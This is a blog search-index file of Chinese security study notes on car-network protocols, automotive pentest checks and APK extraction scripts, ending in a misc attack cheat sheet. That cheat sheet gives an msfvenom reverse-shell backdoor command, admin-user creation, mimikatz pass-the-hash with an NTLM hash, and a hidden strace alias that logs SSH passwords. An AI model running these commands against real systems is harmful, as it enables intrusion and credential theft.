<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>车联网相关协议</title>
      <link href="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/"/>
      <url>/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<p>车载以太网协议簇<img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695193278908-95a9a84a-5498-47aa-9f01-09e960130113.png" alt="image.png"></p><p>车联网 网关<br>UDS统一诊断协议</p><p>SID    诊断服务标识符<br>DID   数据标识符<br>SF     子功能<br>NRC  否定响应码<br>SA     源地址<br>TA    目标地址<br>Tester  测试仪<br>DTC  诊断故障代码<br>寻址方式：物理寻址  即一个UDS报文映射到一个ECU<br>                 功能寻址  一个UDS报文映射到多个ECU中，所有收到报文的ECU都要做出回复<img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695101346169-43ef8efd-cc30-401e-9447-8c07460bf589.png" alt="image.png"></p><p>UDS服务类型：<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695102583687-d8294b5a-7a3b-486a-bc33-9370c85aac07.png" alt="image.png"></p><p><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695102609931-0335c201-13a3-458b-9a54-4628f30bcee4.png" alt="image.png"></p><p>故障码相应类型：<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695102644750-8872df62-d7be-434b-9e08-a7c048d7757c.png" alt="image.png"></p><p><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695102680036-f00d4f5a-3cbc-4dac-a585-f56a0f685f5d.png" alt="image.png"></p><p>诊断故障码：<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695103358312-5f6d801a-1f37-42c2-84e5-9f125f5e8c61.png" alt="image.png"></p><p>DTC状态：<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695104007282-0cac034b-18a7-4535-accb-b33f28655c65.png" alt="image.png"></p><p>CAN协议</p><p>因为CAN协议工作在数据链路层，其各个节点没有网络地址，不了解数据包是由哪个ECU发出来的，而是通过各个CAN封包中的CANID来识别内容<br>通常，车辆控制的CANID分布在0x000<del>0x6FF之间。而诊断信息分布在0x700</del>0x7FF之间。</p><p>DoCAN  Doip  诊断服务​<br>DoCAN</p><p>Doip</p><p>车辆发现的两种方式：<br>DoIP设备启动后，通过UDP向13400端口广播发送vehicle announcement message，源端口号为13400或随机，里面包含此DoIP设备的基本信息，外部测试设备需要监听13400来接收这些信息<br>外部测试设备通过UDP广播发送request消息，目标端口号是13400，DoIP设备监听在13400端口，接收此request并响应<br>​<br>​</p><p>SOME&#x2F;IP 中间件服务<img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695193858790-8a610ca8-775d-49f9-b88d-0ad44e22db97.png" alt="image.png"></p><p>OBD-II  故障代码<img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695362439582-ee27515e-0548-43f4-9ad9-4672af65db97.png" alt="image.png"></p><p>OBD-II通过CAN总线、KWP2000车载诊断协议、J1850和ISO 9141汽车通信协议与ECU模块进行通信，然后OBD-II接口可以通过<a href="https://www.basemu.com/usb2-0%e6%95%b0%e6%8d%ae%e7%ba%bf%e6%8e%a5%e5%8f%a3%e5%ae%9a%e4%b9%89%e5%8f%8a%e6%8e%a5%e5%8f%a3%e5%b0%81%e8%a3%85.html">USB</a>、<a href="https://www.basemu.com/%e9%89%b4%e5%88%ab%e5%90%84%e7%a7%8dusb%e8%bd%acrs232%e6%95%b0%e6%8d%ae%e7%ba%bf.html">RS-232</a>、蓝牙、WiFi、UART等技术将ECU模块中的信息传送到PC或其他终端上，实现对车辆的信息监控或功能控制。<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695362672938-1c7e6782-033d-4830-8b51-594d0e5f72b3.png" alt="image.png"></p><p><strong>车联网存在的网络威胁</strong><br>can纵览协议及其攻击手段<br>CAN网络CAN IDs<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695259718803-e5303602-49f0-40f1-96de-143990d5920c.png" alt="image.png"></p><p>some paper related to can network threat<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695261281231-fcc86a55-4ea6-4896-a1c3-090e0dc760c4.pdf" alt="Fuzzing_CAN_Packets_into_Automobiles.pdf"></p><p>这篇文章只要讲述了汽车中的ECU通过CAN网络进行通信，在OBD ECU中存在蓝牙，wifi等接口，攻击者可以通过连接相应接口，发送有问题的CAN数据包来改变汽车的行为。并且在实验中默认对CAN网络没有深层次的认识，没有使用逆向分析。仅仅是使用开源抓包工具去嗅探CAN数据包，并对其数据帧进行fuzzing，如对某一字节进行fuzzing，最终实现了打开VAN light。</p><p><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695275236664-5bb5244b-8d51-4dff-8402-ae8b108e956b.pdf" alt="Comprehensive Experimental Analyses of Automotive Attack Surfaces.pdf"></p><p>一台笔记本电脑与一个“PassThru”设备(通常直接通过USB或WiFi)连接，然后再插入汽车的OBD-II端口。然后，笔记本电脑上的软件可以对汽车的系统进行询问或编程通过该设备的ecu<br>几乎所有的汽车都配备了能够播放各种音频格式的CD播放器(原始的“红皮书”音频、MP3、WMA等等)。同样，汽车制造商也提供某种外部数字多媒体端口<br>​<br>内外部暴露可以进行I&#x2F;O接口都有可能成为进入汽车内部网络的入口点：<br>OBD-II端口、媒体播放器、蓝牙、无线TPMS传感器、无钥匙进入、卫星无线电、RDS和远程信息处理单元<br>​<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695279840663-2e466195-2ec3-4eb6-bd7b-90fd52f3f4eb.pdf" alt="Efficient_ECU_Analysis_Technology_Through_Structure-Aware_CAN_Fuzzing.pdf"></p><p>攻击者可以窃听CAN总线上的数据流，因为CAN总线上的报文是以广播形式发送的，并且没有经过加密的，没有访问控制，没有授权认证<br>识别内部与外部存在安全威胁的接口<br>1.车外通讯网络        工具：nmap，ubertooth等<br>2.车内通讯网络         方法：逆向工程<br>​<br>ECU的逆向工程软件要求物理访问目标ECU，定位调试端口并获取对应的固件。<br><a href="https://github.com/CANToolz/CANToolz">https://github.com/CANToolz/CANToolz</a><br>2[Accessed: Feb. 1, 2022] <a href="https://github.com/TianTianlove/ATG-python">https://github.com/TianTianlove/ATG-python</a><br>3[Accessed: Feb. 1, 2022] <a href="https://github.com/bhass1/pyfuzz_can">https://github.com/bhass1/pyfuzz_can</a><br>4[Accessed: Feb. 1, 2022] <a href="https://github.com/zombieCraig/UDSim">https://github.com/zombieCraig/UDSim</a><br>5[Accessed: Feb. 1, 2022] <a href="https://github.com/CaringCaribou/caringcaribou">https://github.com/CaringCaribou/caringcaribou</a><br>​<br>存在一个CAN DBfiles，即CAN 数据报数据库，该数据库是机密的不公开，但是研究人员会利用CAN 逆向工程来推算出CAN DBfies。<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695347883882-a9c523b9-4d3d-4a4e-972c-ef5956b72921.png" alt="image.png"></p><p>CAN BUS 渗透</p><p><a href="https://www.eet-china.com/mp/a255122.html">https://www.eet-china.com/mp/a255122.html</a><br>CAN  ECU 测试工具<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE/1695364730395-79766a2e-3d94-4ae1-b041-d6c1d0a08550.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 车联网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>车联网渗透测试</title>
      <link href="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<p>车联网工具</p><p>蓝牙模块​</p><p>不适用硬件支持:</p><p>提供硬件支持：</p><p>简单的蓝牙扫描，链接，抓包，发送包实现渗透<br>基本操作<br>hciconfig 查看蓝牙设备信息<br>hcitool：这是一个查询工具。 可以用来查询设备名称，设备ID，设备类别和设备时钟。<br>hcidump：可以使用这个来嗅探蓝牙通信<br>hciconfig hci0 up 启动蓝牙设备<br>hciconfig hci0 down 关闭蓝牙设备<br>service bluetooth start 启动蓝牙服务<br>bluetoothctl 蓝牙控制台</p><p>can模块<img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1696644047578-eabf2882-4b0e-49ba-a749-27d1c5a4be63.pdf" alt="experimental security analsis of a modren automobile.pdf"></p><p><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1696644049924-74105bff-a165-44b7-8d96-b8080fa7d4fa.pdf" alt="Comprehensive Experimental Analyses of Automotive Attack Surfaces.pdf"></p><p><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1696644062604-2026da52-3fb3-4bec-92cd-03fd4c51b45a.pdf" alt="车联网络协议的模糊测试研究综述.pdf"></p><p><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1696644065591-8d9961b4-9c4f-4145-ae79-1ead6a90091c.pdf" alt="Fuzzing_CAN_Packets_into_Automobiles.pdf"></p><p><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1696644074631-c5097612-88b9-4b12-99fd-32437022bd66.pdf" alt="Efficient_ECU_Analysis_Technology_Through_Structure-Aware_CAN_Fuzzing.pdf"></p><p>can网络测试所需要的工具：<br>pcan<br>can-200u<br>canoe<br>veihcle sy3<br>​<br>pcan使用教程<br>windows&#x2F;linux<br>一.安装驱动</p><p>下载pcan-view<br>​<br>linux安装驱动比较复杂</p><p>安装好驱动以及相应的软件之后，需要将ECU部件链接到pcan，具体是找到ECU中的高低电平与电源引脚。<br>pcan的另一端通过usb连接到电脑<br>​<br>具体测试流程参考：<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1697695384708-7174cf06-359b-4521-aecc-abc5dbad8437.docx" alt="CANFD-200U测试步骤.docx"></p><p>诊断ID查找：通过7df广播帧找寻应答帧，一般诊断ID&#x3D;应答ID-8，也可以采用遍历的方法找到诊断ID，具体就是发送can帧后有应答ID(不是广播帧),那么发送can帧的id就是诊断ID<br>​<br>​<br>​<br>无线模块<br>无限网络加密协议：</p><p>wifi钓鱼工具：</p><p>wifi渗透：</p><p>危害：<br><img src="/2024/03/14/%E8%BD%A6%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1696662463701-86e1f38a-0392-40fe-9c18-474aa092eb8b.png" alt="image.png"></p><p>一个基于wifi攻击的典型例子：</p><p>gps模块gps信号制作：.kml<br>                    .nmea<br>​</p><p>射频模块</p><p>pcan-ACU 测试<br>诊断：28服务之前 -&gt;扩展会话   02 10 03<br>          11服务<br>          27服务之前 -&gt; 扩展会话  02 10 03<br>          2F服务之前-&gt; 扩展会话   02  10 03<br>车机app模块1.前置知识-编写自动化脚本来拉取车机中的apk包</p><p>例子：将车机中的报名保存到外部文件中-windows 脚本<br>首先创建pull-all-packages.bat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">adb.exe shell &lt; cmd.txt //这部分是执行adb服务，输入就是cmd.txt文件中的内容</span><br></pre></td></tr></table></figure><p>接着创建cmd.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">pm list packages</span><br><span class="line">//这里写在shell中所要执行的脚本</span><br></pre></td></tr></table></figure><p>最后创建pull.bat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">pull-all-packages.bat &gt; packages.txt</span><br><span class="line">//这里是主执行脚本，就是将pull-all-packages.bat所执行的结果保存到packages.txt中</span><br></pre></td></tr></table></figure><p>经过上面三部操作就能讲车机中的报名保存到外部文件中<br>​<br>2.输出所有报名所在的路径<br>这里需要对上一步输出的包名做处理exchange.bat<br>exchange.bat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off &amp; setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">@REM 需要被替换的字符串,注意字符串前后不加“”，支持空格</span><br><span class="line"><span class="built_in">set</span> var1=package:   //这里是要替换的字符串</span><br><span class="line">@REM 替换成什么内容，此处是批处理当前路径</span><br><span class="line"><span class="built_in">set</span> var2=            //这里输入替换的字符串</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /r %%i <span class="keyword">in</span> (package.txt) <span class="keyword">do</span> (        //这里的.txt为目的文件</span><br><span class="line">    <span class="built_in">echo</span> %%i</span><br><span class="line">    @REM 读取a.txt所有内容 </span><br><span class="line">    <span class="keyword">for</span> /f <span class="string">&quot;eol=* tokens=*&quot;</span> %%j <span class="keyword">in</span> (%%i) <span class="keyword">do</span> ( </span><br><span class="line">        @REM 设置变量a为每行内容 </span><br><span class="line">        <span class="built_in">set</span> a=%%j </span><br><span class="line">        @REM 如果该行有var1，则将其改为var2</span><br><span class="line">        <span class="built_in">set</span> <span class="string">&quot;a=!a:%var1%=%var2%!&quot;</span> </span><br><span class="line">        <span class="built_in">echo</span> !a!</span><br><span class="line">        @REM 把修改后的全部行存入$ </span><br><span class="line">        <span class="built_in">echo</span> !a!&gt;&gt;$</span><br><span class="line">    ) </span><br><span class="line">    @REM 用$的内容替换原来a.txt内容 </span><br><span class="line">    move $ %%i</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>处理完成之后，现在需要在pull.bat添加后续内容<br>pull.bat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">pull-all-packages.bat &gt; packages.txt</span><br><span class="line">//这里是主执行脚本，就是将pull-all-packages.bat所执行的结果保存到packages.txt中</span><br><span class="line">exchange.bat</span><br><span class="line">get-the-path.bat &gt; apk-path.txt //将包名对应的路径名保存下来</span><br></pre></td></tr></table></figure><p>创建get-the-path.bat<br>get-the-path.bat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">rem 逐行读取tmp.txt文件内容，每行采用逗号分隔，将处理后的内容存入变量</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line">for /f &quot;tokens=1&quot; %%i in (package.txt) do (</span><br><span class="line">set name=%%i</span><br><span class="line">rem echo !name!</span><br><span class="line">adb.exe shell pm path !name!</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上完成了包名路径的解析，剩下就是拉取apk包<br>首先对path文件处理<br>cope-the-paths</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">@echo off &amp; setlocal enabledelayedexpansion</span><br><span class="line"></span><br><span class="line">@REM 需要被替换的字符串,注意字符串前后不加“”，支持空格</span><br><span class="line">set var1=package:</span><br><span class="line">@REM 替换成什么内容，此处是批处理当前路径</span><br><span class="line">set var2=</span><br><span class="line"></span><br><span class="line">for /r %%i in (apk-path.txt) do (</span><br><span class="line">    echo %%i</span><br><span class="line">    @REM 读取a.txt所有内容 </span><br><span class="line">    for /f &quot;eol=* tokens=*&quot; %%j in (%%i) do ( </span><br><span class="line">        @REM 设置变量a为每行内容 </span><br><span class="line">        set a=%%j </span><br><span class="line">        @REM 如果该行有var1，则将其改为var2</span><br><span class="line">        set &quot;a=!a:%var1%=%var2%!&quot; </span><br><span class="line">        echo !a!</span><br><span class="line">        @REM 把修改后的全部行存入$ </span><br><span class="line">        echo !a!&gt;&gt;$</span><br><span class="line">    ) </span><br><span class="line">    @REM 用$的内容替换原来a.txt内容 </span><br><span class="line">    move $ %%i</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>创建get-the-apk.bat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">rem 逐行读取tmp.txt文件内容，每行采用逗号分隔，将处理后的内容存入变量</span><br><span class="line">setlocal enabledelayedexpansion</span><br><span class="line">for /f &quot;tokens=1&quot; %%i in (apk-path.txt) do (</span><br><span class="line">set name=%%i</span><br><span class="line">echo !name!</span><br><span class="line">rem adb.exe shell pm path !name!</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在pull.bat添加<br>pull.bat</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">rem pull-all-pages.bat &gt; package.txt</span><br><span class="line">cope-the-pages.bat </span><br><span class="line">get-the-paths.bat &gt; apk-path.txt</span><br><span class="line">cope-the-paths.bat</span><br><span class="line">get-the-apk.bat &gt; C:\Users\00327694\Downloads\apk</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拉取到的apk会保存在指定的目录中，后面就是进行解包<br>解包条件：<br>1.环境  java8-  <a href="https://blog.csdn.net/engineer_why/article/details/126278075">https://blog.csdn.net/engineer_why&#x2F;article&#x2F;details&#x2F;126278075</a><br>2.工具 apktool  <a href="https://apktool.org/docs/install">https://apktool.org/docs/install</a><br>自动化bat<br>创建unpackage.bat<br>unpackeage.bat</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off &amp;setlocal enabledelayedexpansion</span><br><span class="line">rem <span class="built_in">echo</span> 当前目录:%~dp0</span><br><span class="line"><span class="built_in">cd</span> C:\Users\曹志强\Desktop\apk</span><br><span class="line"><span class="built_in">set</span> DestPath=%<span class="built_in">cd</span>%</span><br><span class="line">rem 查找的扩展名</span><br><span class="line"><span class="built_in">set</span> DestExt=*.apk</span><br><span class="line">rem 不提示删除之前生成的问题，不存在也不提示</span><br><span class="line"></span><br><span class="line">rem 循环文件目录里所有的文件(包括子文件夹里的文件)</span><br><span class="line">(<span class="keyword">for</span> /f <span class="string">&quot;usebackq delims=&quot;</span> %%i <span class="keyword">in</span> (`<span class="built_in">dir</span> /b/a-d/s  <span class="string">&quot;%DestPath%\%DestExt%&quot;</span>`)  <span class="keyword">do</span> (</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> C:\Users\曹志强\Desktop\apk</span><br><span class="line">apktool d  %%~nxi </span><br><span class="line"></span><br><span class="line">))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>apk签名检测<br>工具：keytool；mobsf<br>apkinfo <a href="https://github.com/saucer-man/apkinfo">https://github.com/saucer-man/apkinfo</a></p><p>app加壳脱壳</p><p>apk敏感信息</p><p><a href="https://www.moonsec.com/1669.html">https://www.moonsec.com/1669.html</a></p><p>apk动态加载</p><p>车机app 组件模块</p><p>usb模块1.usb主机包刷写<br>主机包刷写：主机包+主机包签名文件<br>1.1主机包内容刷写<br>前提是必须有签名文件，下一步是修改主机报的内容，再重新进行刷写操作。<br>1.2主机包签名文件修改<br>修改主机包的签名文件，再重新进行刷写操作。<br>​<br>2.badusb测试<br>使用badusb工具连接到DMC主机端，检查DMC端是否有异常行为。<br>​<br>3.usb-端口类型<br>在不进入工程模式的情况下，使用usb线连接到DMC主机usb接口，使用命令adb devices &amp;&amp; adb shell查看是否能够识别到adb服务设备。<br>​<br>4.usb-白名单机制<br>查看DMC白名单目录，自行整理文件包含白名单目录中的和白名单目录之外的文件，之后将U盘接入usb接口，检查DMC所识别的文件格式是否是白名单内的文件。<br>5.usb-hint攻击<br>使用键盘，鼠标等连接DMC主机的usb口，查看能否使用到鼠标以及键盘操作DMC。<br>​<br>控车app抓包</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 车联网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安全知识杂项</title>
      <link href="/2024/03/14/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%9D%82%E9%A1%B9/"/>
      <url>/2024/03/14/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%9D%82%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<p>linux模糊查询文件</p><p>反弹后门生成器<br>查找ippsec用户的权限文件find &#x2F; -group ippsec -type d 2&gt;&#x2F;dev&#x2F;null | grep -v proc<br>hashcat用法</p><p>ftp用法<br><strong>vbox 与 vware网络互联</strong>分别在对应的虚拟机主机使用主机模式<br>在外层物理机中将两个对应主机模式的网卡使用桥接模式，在网桥中设置两个虚拟机中对应的同一网段ip，掩码就行了<br>​<br>john 开膛手用法john -rules -wordlist&#x3D;pass.txt - stdout | sort | uniq &gt; wordlist.txt  基于规则生成密码</p><p>密码爆破<br>hydra教程<br>linux增加用户useradd  username<br>passadd username</p><p>linux向文件添加内容<br><strong>apache 与 Nginx的区别</strong><br>** Apache采用多进程架构，每个请求都由一个独立的进程处理；而Nginx采用异步事件驱动的架构，可以处理更多的并发连接。  **</p><p> **文件包含漏洞主要关注的是用户输入的文件路径或URL的处理，而文件上传漏洞主要关注的是对用户上传文件的验证和过滤  **<br>wget下载与安装<br>vps<br>kali开放端口<br>net start  主要是虚拟机与防火墙服务<br>windows 3389远程桌面 <strong>mstsc</strong><br>kali开启小型的服务器<br>** sudo python2 -m SimpleHTTPServer 80    **<br><strong>python3 -m http.server 9999</strong><br><strong>Windows增加用户</strong><br><strong>net user curry 123456 &#x2F;add</strong><br><strong>将用户加入admin组</strong><br><strong>net localgroup adminstrators curry &#x2F;add</strong><br><strong>​</strong><br><strong>kali利用msfconsole使用监听器模块</strong><br><strong>use exploit&#x2F;multi&#x2F;handler</strong><br><strong>​</strong><br><strong>查看会话</strong><br><strong>sessions -l</strong></p><p><strong>进程自动迁移</strong><br><strong>set AutoRunScript migrate -f</strong><br><strong>在kali上生成后门文件</strong><br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.0.195 lport&#x3D;12345 -f  exe &gt;s.exe<br>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>其中lhost为监听的主机ip<br>监听成功之后使用；‘’<br>msf中切换shell ：<strong>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’ **<br><strong>hashdump</strong>来导出</strong>用户名与哈希值**<br><strong>nc命令监听端口</strong><br><strong>nc -lvnp 8888</strong></p><hr><p>** SSH Keylogger记录密码**<br>当前系统如果存在strace的话，它可以跟踪任何进程的系统调用和数据，可以利用 strace 系统调试工具<br>获取 ssh 的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。 </p><p>在当前用户的 .bashrc 里新建一条 alias ，这样可以抓取他登陆其他机器的 ssh 密码<br>设置完毕后，倘若当前系统不存在alias，那么就会影响其正常使用：<br>alias ssh&#x3D;’strace -o &#x2F;tmp&#x2F;.sshpwd-<code>date &#39;+%d%h%m%s&#39;</code>.log -e read,write,connect -<br>s2048 ssh’<br>生效source .bashrc</p><p>打开注册表regedit</p><p>cobalt strike开启命令在kali中:<br><strong>sudo   .&#x2F;teamserver    ip地址   密码如 sudo .&#x2F;teamserver 192.168.0.1 12345</strong><br>如果没有执行权限可以使用**sudo chmod +x teamserver **</p><hr><p><strong>横向渗透PTH</strong><br><strong>dir \192.168.248.136\c$</strong><br><img src="/2024/03/14/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%9D%82%E9%A1%B9/1689491944781-1021ec47-73fd-418d-8ff7-ea678c1e1018.png" alt="image.png"></p><p>如果做了PTH连接就会成功，以管理员身份运行mimikatz,<br><strong>privilege::debug</strong><br><strong>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:192.168.248.136 &#x2F;ntlm:627782b7274e323941c9418399460d5b</strong><br><img src="/2024/03/14/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E6%9D%82%E9%A1%B9/1689493106956-9075d55a-aa68-4fa6-a2df-e919eb5edd36.png" alt="image.png"></p><p>内网渗透中将一个普通域用户赋予委派权限<br>setspn -A https&#x2F;web web<br>删除其委派权限<br>setspn -d https&#x2F;web web</p><p>windows中切换管理员用户命令<br>runas &#x2F;profile &#x2F;user:12server2\administrator cmd.exe<br>​<br>​<br><strong>非约束委派攻击</strong><br><strong>前提是需要域控管理员主动去访问委派域控用户</strong><br><strong>​</strong><br><strong>​</strong></p><p><strong>​</strong><br><strong>​</strong><br><strong>​</strong></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透中的一些配置</title>
      <link href="/2024/03/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/03/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E9%85%8D%E7%BD%AE/</url>
      
